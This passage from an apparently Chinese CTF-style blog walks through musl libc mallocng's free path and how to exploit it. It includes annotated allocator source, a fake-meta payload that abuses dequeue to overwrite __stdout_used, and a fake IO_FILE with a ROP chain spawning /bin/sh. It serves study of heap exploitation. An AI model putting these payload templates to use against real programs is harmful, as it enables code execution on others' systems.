class="keyword">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;idx, all = (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span>;</span><br><span class="line">	((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p)[<span class="number">-3</span>] = <span class="number">255</span>;</span><br><span class="line">	<span class="comment">// invalidate offset to group header, and cycle offset of</span></span><br><span class="line">	<span class="comment">// used region within slot if current offset is zero.</span></span><br><span class="line">	*(<span class="keyword">uint16_t</span> *)((<span class="keyword">char</span> *)p<span class="number">-2</span>) = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// release any whole pages contained in the slot to be freed</span></span><br><span class="line">	<span class="comment">// unless it&#x27;s a single-slot group that will be unmapped.</span></span><br><span class="line">	<span class="keyword">if</span> (((<span class="keyword">uintptr_t</span>)(start<span class="number">-1</span>) ^ (<span class="keyword">uintptr_t</span>)end) &gt;= <span class="number">2</span>*PGSZ &amp;&amp; g-&gt;last_idx) &#123;</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">char</span> *base = start + (-(<span class="keyword">uintptr_t</span>)start &amp; (PGSZ<span class="number">-1</span>));</span><br><span class="line">		<span class="keyword">size_t</span> len = (end-base) &amp; -PGSZ;</span><br><span class="line">		<span class="keyword">if</span> (len) madvise(base, len, MADV_FREE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// atomic free without locking if this is neither first or last slot</span></span><br><span class="line">    <span class="comment">//在meta-&gt;freed_mask中标记一下, 表示这个chunk已经被释放了</span></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">		<span class="keyword">uint32_t</span> freed = g-&gt;freed_mask;</span><br><span class="line">		<span class="keyword">uint32_t</span> avail = g-&gt;avail_mask;</span><br><span class="line">		<span class="keyword">uint32_t</span> mask = freed | avail;</span><br><span class="line">		assert(!(mask&amp;self));<span class="comment">//要释放的chunk应该既不在freed中, 也不在avail中</span></span><br><span class="line">        </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1.如果满足  mask+self==all  , 那就说明释放了这个chunk之后这个group</span></span><br><span class="line"><span class="comment">中所有chunk都被释放,就需要调用nontrivial_free回收整个meta-group</span></span><br><span class="line"><span class="comment">因此这个meta需要调用nontrivial_free()回收这个group</span></span><br><span class="line"><span class="comment">2.如果满足  !freed  ,那么就说明该meta-group中没有被释放的chunk,有可能是第一次从该</span></span><br><span class="line"><span class="comment">有可能这个group全部被分配出去了, 这样group是会弹出avtive队列的, 而现在释放了一个</span></span><br><span class="line"><span class="comment">其中的chunk,所以需要调用nontrivial_free()把这个group重新加入队列</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">		<span class="keyword">if</span> (!freed || mask+self==all) <span class="keyword">break</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//线程方面的一些知识，还不是太会</span></span><br><span class="line">		<span class="keyword">if</span> (!MT)</span><br><span class="line">			g-&gt;freed_mask = freed+self;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;freed_mask, freed, freed+self)!=freed)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	wrlock();</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> nontrivial_free(g, idx);</span><br><span class="line">	unlock();</span><br><span class="line">	<span class="keyword">if</span> (mi.len) munmap(mi.base, mi.len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<ul>
<li>通过<code>get_meta()</code>找到chunk对应的meta，重置idx与offset，将meta的freed_mask中标记一下就算释放完毕了。</li>
<li>有一些特殊情况的，需要跳出循环来调用<code>nontrivial_free()</code>完成相关操作</li>
</ul>

        <h4 id="①nontrivial-free"   >
          <a href="#①nontrivial-free" class="heading-link"><i class="fas fa-link"></i></a><a href="#①nontrivial-free" class="headerlink" title="①nontrivial_free()"></a>①nontrivial_free()</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct mapinfo <span class="title">nontrivial_free</span><span class="params">(struct meta *g, <span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;i;</span><br><span class="line">	<span class="keyword">int</span> sc = g-&gt;sizeclass;</span><br><span class="line">	<span class="keyword">uint32_t</span> mask = g-&gt;freed_mask | g-&gt;avail_mask;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//如果meta-group中所有chunk要么被释放要么可使用</span></span><br><span class="line">    <span class="comment">//并且g可以被释放(不是mmap出来的),那么就要回收掉整个meta</span></span><br><span class="line">	<span class="keyword">if</span> (mask+self == (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span> &amp;&amp; okay_to_free(g)) &#123;</span><br><span class="line">		<span class="comment">// any multi-slot group is necessarily on an active list</span></span><br><span class="line">		<span class="comment">// here, but single-slot groups might or might not be.</span></span><br><span class="line">		<span class="keyword">if</span> (g-&gt;next) &#123;</span><br><span class="line">             <span class="comment">//检查sc释放合法, 不是mmap(63)的</span></span><br><span class="line">			assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">            <span class="comment">//如果g是队列中开头的meta, 那么弹出队列后, 要激活后一个</span></span><br><span class="line">			<span class="keyword">int</span> activate_new = (ctx.active[sc]==g);</span><br><span class="line">			dequeue(&amp;ctx.active[sc], g);</span><br><span class="line">            <span class="comment">//激活后一个meta过程中需要完成avail_mask和free_mask的设置</span></span><br><span class="line">            <span class="comment">//即free_mask向avail_maks进行转移</span></span><br><span class="line">			<span class="keyword">if</span> (activate_new &amp;&amp; ctx.active[sc])</span><br><span class="line">				activate_group(ctx.active[sc]);</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="comment">//现在要释放这个meta-group,放入ctx.free_meta_head中</span></span><br><span class="line">		<span class="keyword">return</span> free_group(g);</span><br><span class="line">        </span><br><span class="line">	&#125; </span><br><span class="line">    <span class="comment">//如果mask==0, 也就是这个meta-group中所有的chunk都被分配出去了</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!mask) &#123;</span><br><span class="line">		assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">		<span class="comment">// might still be active if there were no allocations</span></span><br><span class="line">		<span class="comment">// after last available slot was taken.</span></span><br><span class="line">        <span class="comment">//现在这个全部chunk被分配出去的group中有一个chunk要被释放了</span></span><br><span class="line">        <span class="comment">//因此这个meta-group要重新入队</span></span><br><span class="line">		<span class="keyword">if</span> (ctx.active[sc] != g) &#123;</span><br><span class="line">			<span class="built_in">queue</span>(&amp;ctx.active[sc], g);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	a_or(&amp;g-&gt;freed_mask, self);</span><br><span class="line">	<span class="keyword">return</span> (struct mapinfo)&#123; <span class="number">0</span> &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h4 id="②dequeue"   >
          <a href="#②dequeue" class="heading-link"><i class="fas fa-link"></i></a><a href="#②dequeue" class="headerlink" title="②dequeue"></a>②dequeue</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.1 /src/malloc/mallocng/meta.h</span></span><br><span class="line"><span class="comment">//meta的出队操作，一般漏洞点出在这里</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">dequeue</span><span class="params">(struct meta **phead, struct meta *m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (m-&gt;next != m) &#123;</span><br><span class="line">		m-&gt;prev-&gt;next = m-&gt;next;</span><br><span class="line">		m-&gt;next-&gt;prev = m-&gt;prev;</span><br><span class="line">		<span class="keyword">if</span> (*phead == m) *phead = m-&gt;next;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		*phead = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	m-&gt;prev = m-&gt;next = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>没有检测meta中的next和prev指针是否合法，如果可以伪造一个meta传入，控制它的prev/next指针，就可以做到像unlink一样的任意写</p>

        <h4 id="③queue"   >
          <a href="#③queue" class="heading-link"><i class="fas fa-link"></i></a><a href="#③queue" class="headerlink" title="③queue"></a>③queue</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.2 /src/malloc/mallocng/meta.h</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">queue</span><span class="params">(struct meta **phead, struct meta *m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	assert(!m-&gt;next);</span><br><span class="line">	assert(!m-&gt;prev);</span><br><span class="line">	<span class="keyword">if</span> (*phead) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">head</span> =</span> *phead;</span><br><span class="line">		m-&gt;next = head;</span><br><span class="line">		m-&gt;prev = head-&gt;prev;</span><br><span class="line">		m-&gt;next-&gt;prev = m-&gt;prev-&gt;next = m;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		m-&gt;prev = m-&gt;next = m;</span><br><span class="line">		*phead = m;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>当meta进入该函数，就会发生解链，然后进入到对应的active[sc]中，这种情况需要active[sc] = NULL，即该sizeclass下暂时不存在可用的meta。</p>

        <h2 id="🔺注：-1"   >
          <a href="#🔺注：-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺注：-1" class="headerlink" title="🔺注："></a>🔺注：</h2>
      <p>malloc和free的时候不会将chunk的内容置空，这个给我们创造了UAF的一些条件，同样的也有相应的静态堆内存</p>

        <h2 id="4-利用方式"   >
          <a href="#4-利用方式" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-利用方式" class="headerlink" title="4.利用方式"></a>4.利用方式</h2>
      
        <h3 id="1-泄露地址-1"   >
          <a href="#1-泄露地址-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-泄露地址-1" class="headerlink" title="(1)泄露地址"></a>(1)泄露地址</h3>
      <p>通常使用静态堆内存来进行泄露，但是这里就涉及一个问题，静态堆内存就算申请到了，也没有指针啊。所以现在的题目好多都是申请一个chunk结构体，比如</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">strChunk</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">char</span> size[<span class="number">8</span>];</span><br><span class="line">	<span class="keyword">char</span>* data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">strChunk</span>* <span class="title">myChunk</span> =</span> <span class="built_in">malloc</span>(xxx); </span><br><span class="line">myChunk.data = <span class="built_in">malloc</span>(xxx);</span><br></pre></td></tr></table></div></figure>

<p>这样在在一定的UAF或者溢出条件下，就可以泄露出data指针，而如果这个data指针恰好是从静态堆内存申请出来的，那么就能泄露libc地址了。</p>
<p>heap地址也是类似，一般就是通过溢出或者UAF之类的来泄露了。</p>
<p>如果没有的话，我能想到的就是无限申请，直到耗尽meta的空间，当它再开辟的meta空间的时候，由于是mmap分配的，那么就有可能申请出libc的空间</p>

        <h3 id="2-getshell-1"   >
          <a href="#2-getshell-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-getshell-1" class="headerlink" title="(2)getshell"></a>(2)getshell</h3>
      
        <h4 id="①secret"   >
          <a href="#①secret" class="heading-link"><i class="fas fa-link"></i></a><a href="#①secret" class="headerlink" title="①secret"></a>①secret</h4>
      <p>想要伪造meta，首先需要泄露secrect校验值</p>

        <h4 id="②伪造meta"   >
          <a href="#②伪造meta" class="heading-link"><i class="fas fa-link"></i></a><a href="#②伪造meta" class="headerlink" title="②伪造meta"></a>②伪造meta</h4>
      <p>先行的方法基本都是伪造<code>meta</code>，伪造之后通常是通过两种方法进行利用，不同的方法伪造的<code>meta</code>基本也是不同的，下面具体介绍。</p>

        <h5 id="a-dequeue"   >
          <a href="#a-dequeue" class="heading-link"><i class="fas fa-link"></i></a><a href="#a-dequeue" class="headerlink" title="a.dequeue"></a>a.dequeue</h5>
      <p>调用链为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_libc_free-&gt;nontrivial_free-&gt;dequeue</span><br></pre></td></tr></table></div></figure>

<p>这种是通过<code>dequeue</code>进行任意写覆盖<code>__stdout_used</code>指针(就像libc里面的<code>IO_list_all</code>)，然后伪造<code>__IO_FILE</code>，通过IO进行攻击。</p>
<p>伪造的<code>meta</code></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sizeclass = <span class="number">1</span>      	<span class="comment">#</span></span><br><span class="line">freeable = <span class="number">1</span></span><br><span class="line">last_idx = <span class="number">6</span>  		<span class="comment">#</span></span><br><span class="line">maplen = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">fake_meta = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_meta += p64(stdout_used_addr-<span class="number">0x8</span>) 		<span class="comment"># prev</span></span><br><span class="line">fake_meta += p64(fake_IO_addr)			 	<span class="comment"># next</span></span><br><span class="line">fake_meta += p64(base) 						<span class="comment"># mem</span></span><br><span class="line">fake_meta += p32(<span class="number">0x7e</span>) + p32(<span class="number">0</span>) <span class="comment"># avail_mask, freed_mask</span></span><br><span class="line">fake_meta += p64((maplen &lt;&lt; <span class="number">12</span>) | (sizeclass &lt;&lt; <span class="number">6</span>) | (freeable &lt;&lt; <span class="number">5</span>) | last_idx)</span><br><span class="line">fake_meta += p64(<span class="number">0</span>)</span><br></pre></td></tr></table></div></figure>

<ul>
<li><p>获取<code>__stdout_used</code></p>
<p>这里通过<code>dequeue</code>就是将<code>fake_IO_addr</code>赋值给<code>__stdout_used</code>，<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230816194459069.png" alt="image-20230816194459069"></p>
<p>里面存放的是<code>stdout</code>的<code>__IO_FILE</code>结构体。对于去掉符号信息的<code>libc</code>，不知道<code>__stdout_used</code>在哪的可以尝试分析<code>exit</code>里面调用的<code>__stdio_exit</code>函数去看在哪里，</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.2 /src/exit/exit.c</span></span><br><span class="line"><span class="function">_Noreturn <span class="keyword">void</span> <span class="title">exit</span><span class="params">(<span class="keyword">int</span> code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__funcs_on_exit();</span><br><span class="line">	__libc_exit_fini();</span><br><span class="line">	__stdio_exit();</span><br><span class="line">	_Exit(code);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230816195302098.png" alt="image-20230816195302098"></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.2 /src/stdio/__stdio_exit.c</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __stdio_exit(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">	FILE *f;</span><br><span class="line">	<span class="keyword">for</span> (f=*__ofl_lock(); f; f=f-&gt;next) close_file(f);</span><br><span class="line">	close_file(__stdin_used);</span><br><span class="line">	close_file(__stdout_used);</span><br><span class="line">	close_file(__stderr_used);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230816195412866.png" alt="image-20230816195412866"></p>
<p>其实这里也可以看到，劫持<code>__stdin_used/__stderr_used</code>也是一样的效果，但是实际中比较不容易出错的应该是<code>__stdout_used</code>用的比较多</p>
</li>
<li><p>伪造<code>fake_IO_addr</code></p>
<p>主要是伪造几个关键的点，常见的伪造模板如下</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ROP</span></span><br><span class="line"></span><br><span class="line">gadget_addr = libc_base + libc.sym[<span class="string">&#x27;longjmp&#x27;</span>] + <span class="number">30</span></span><br><span class="line"><span class="comment">#mov     rsp, [rdi+30h];jmp     qword ptr [rdi+38h]</span></span><br><span class="line"></span><br><span class="line">fake_IO = p64(<span class="number">0</span>)                       			<span class="comment"># flags</span></span><br><span class="line">fake_IO += p64(<span class="number">0</span>)                               <span class="comment"># rpos</span></span><br><span class="line">fake_IO += p64(<span class="number">0</span>)                               <span class="comment"># rend</span></span><br><span class="line">fake_IO += p64(rop_addr)                        <span class="comment"># close</span></span><br><span class="line">fake_IO += p64(<span class="number">1</span>)                               <span class="comment"># wend</span></span><br><span class="line">fake_IO += p64(<span class="number">1</span>)                               <span class="comment"># wpos</span></span><br><span class="line">fake_IO += p64(rop_addr+<span class="number">0x8</span>)                    <span class="comment"># mustbezero_1 	#0x30</span></span><br><span class="line">fake_IO += p64(pop_rdi_ret)                     <span class="comment"># wbase			#0x38</span></span><br><span class="line">fake_IO += p64(<span class="number">0</span>)                               <span class="comment"># read</span></span><br><span class="line">fake_IO += p64(gadget_addr)  					<span class="comment"># write</span></span><br><span class="line"></span><br><span class="line">binsh_addr = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">rop = <span class="string">&quot;&quot;</span></span><br><span class="line">rop += p64(pop_rdi_ret) + p64(binsh_addr)</span><br><span class="line">rop += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(pop_rdx_ret) + p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(pop_rax_ret) + p64(<span class="number">59</span>)</span><br><span class="line">rop += p64(syscall_ret)</span><br></pre></td></tr></table></div></figure>

<p>通过<code>close_file</code>函数中的<code>f-&gt;write</code>进入<code>gadget</code>，然后依据<code>rdi</code>劫持<code>rsp</code>，从而进行<code>ROP</code></p>
</li>
<li><p><code>base</code>获取</p>
<p>这个通常是用来绕过在进入<code>nontrivial_free</code>函数之前的<code>get_meta</code>函数中针对<code>meta</code>检查的，链子为<code>__libc_free-&gt;get_meta</code>在如下代码中</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.2 /src/malloc/mallocng/meta.h</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct meta *<span class="title">get_meta</span><span class="params">(<span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	assert(!((<span class="keyword">uintptr_t</span>)p &amp; <span class="number">15</span>));</span><br><span class="line">	<span class="keyword">int</span> offset = *(<span class="keyword">const</span> <span class="keyword">uint16_t</span> *)(p - <span class="number">2</span>);</span><br><span class="line">	<span class="keyword">int</span> index = get_slot_index(p);</span><br><span class="line">	<span class="keyword">if</span> (p[<span class="number">-4</span>]) &#123;</span><br><span class="line">		assert(!offset);</span><br><span class="line">		offset = *(<span class="keyword">uint32_t</span> *)(p - <span class="number">8</span>);</span><br><span class="line">		assert(offset &gt; <span class="number">0xffff</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">base</span> =</span> (<span class="keyword">const</span> <span class="keyword">void</span> *)(p - UNIT*offset - UNIT);</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span> =</span> base-&gt;meta;</span><br><span class="line">	assert(meta-&gt;mem == base);  <span class="comment">//主要用来绕过这里</span></span><br><span class="line">	assert(index &lt;= meta-&gt;last_idx);</span><br><span class="line">	assert(!(meta-&gt;avail_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line">	assert(!(meta-&gt;freed_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">area</span> =</span> (<span class="keyword">void</span> *)((<span class="keyword">uintptr_t</span>)meta &amp; <span class="number">-4096</span>);</span><br><span class="line">	assert(area-&gt;check == ctx.secret);</span><br><span class="line">	<span class="keyword">if</span> (meta-&gt;sizeclass &lt; <span class="number">48</span>) &#123;</span><br><span class="line">		assert(offset &gt;= size_classes[meta-&gt;sizeclass]*index);</span><br><span class="line">		assert(offset &lt; size_classes[meta-&gt;sizeclass]*(index+<span class="number">1</span>));</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		assert(meta-&gt;sizeclass == <span class="number">63</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (meta-&gt;maplen) &#123;</span><br><span class="line">		assert(offset &lt;= meta-&gt;maplen*<span class="number">4096UL</span>/UNIT - <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> (struct meta *)meta;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>需要满足<code>meta-&gt;mem=base</code>，这里的<code>base</code>就是通过进入索引为0的<code>chunk_addr-0x10</code>，比如如下索引为0的<code>chunk</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230817192343088.png" alt="image-20230817192343088"></p>
<p>这里获取得到<code>base</code>之后，进一步得到<code>meta</code>，即为<code>0x7ffff7fff0010</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230817192915034.png" alt="image-20230817192915034"></p>
</li>
<li><p>设置<code>avail_mask</code>、<code>freed_mask</code>、<code>last_idx</code>、<code>freeable</code>、<code>sizeclass</code>、<code>maplen</code></p>
<p>设置这几个参数，主要用于通过<code>nontrivial_free</code>函数中的检查，包括<code>ok_to_free</code>和<code>get_stride</code>，如下代码所示</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.2 /src/malloc/mallocng/free.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct mapinfo <span class="title">nontrivial_free</span><span class="params">(struct meta *g, <span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;i;</span><br><span class="line">	<span class="keyword">int</span> sc = g-&gt;sizeclass;</span><br><span class="line">	<span class="keyword">uint32_t</span> mask = g-&gt;freed_mask | g-&gt;avail_mask;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">//通过适当计算进行设置,0x7e+1 == (2&lt;&lt;1)-1 == 127</span></span><br><span class="line">    <span class="comment">//ok_to_free就是做一些检查,满足freeable==1,sizeclass&lt;48,maplen==1</span></span><br><span class="line">    <span class="comment">//然后通过g-&gt;next!=g来返回1</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//v1.2.2  /src/malloc/mallocng/free.c</span></span><br><span class="line"><span class="comment">static int okay_to_free(struct meta *g)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">	int sc = g-&gt;sizeclass;</span></span><br><span class="line"><span class="comment">	if (!g-&gt;freeable) return 0;</span></span><br><span class="line"><span class="comment">	if (sc &gt;= 48 || get_stride(g) &lt; UNIT*size_classes[sc])</span></span><br><span class="line"><span class="comment">		return 1;</span></span><br><span class="line"><span class="comment">	if (!g-&gt;maplen) return 1;</span></span><br><span class="line"><span class="comment">	if (g-&gt;next != g) return 1;</span></span><br><span class="line"><span class="comment">	if (!is_bouncing(sc)) return 1;</span></span><br><span class="line"><span class="comment">	size_t cnt = g-&gt;last_idx+1;</span></span><br><span class="line"><span class="comment">	size_t usage = ctx.usage_by_class[sc];</span></span><br><span class="line"><span class="comment">	if (9*cnt &lt;= usage &amp;&amp; cnt &lt; 20)</span></span><br><span class="line"><span class="comment">		return 1;</span></span><br><span class="line"><span class="comment">	return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">	<span class="keyword">if</span> (mask+self == (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span> &amp;&amp; okay_to_free(g)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (g-&gt;next) &#123;</span><br><span class="line">			assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">            <span class="comment">//......</span></span><br><span class="line">			